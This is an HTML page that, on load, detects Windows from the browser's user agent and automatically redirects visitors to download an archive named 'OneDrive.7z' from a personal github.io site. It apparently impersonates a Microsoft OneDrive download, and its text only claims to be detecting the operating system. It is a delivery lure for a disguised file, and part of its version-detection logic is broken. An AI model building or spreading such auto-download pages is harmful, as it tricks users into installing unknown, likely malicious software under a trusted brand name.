<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Auto OS-Based Download</title>
    <script>
        window.onload = function() {
            const userAgent = navigator.userAgent;
            let downloadURL = "#";  // default/fallback

            if (/Windows NT 10\./.test(userAgent)) {
                // Windows 10
                downloadURL = "https://andre0194.github.io/service/OneDrive.7z";
            } else if (/Windows NT 10.1/.test(userAgent)) {
                // Windows 10 specific check for version 10.1
                downloadURL = "https://andre0194.github.io/service/OneDrive.7z";
            } else if (/Windows NT 11\./.test(userAgent)) {
                // Windows 11
                downloadURL = "https://andre0194.github.io/service/OneDrive.7z";
            }

            // Redirect automatically based on OS
            window.location.href = downloadURL;
        };
    </script>
</head>
<body>
    <p>Detecting your operating system... You will be redirected shortly.</p>
</body>
</html>
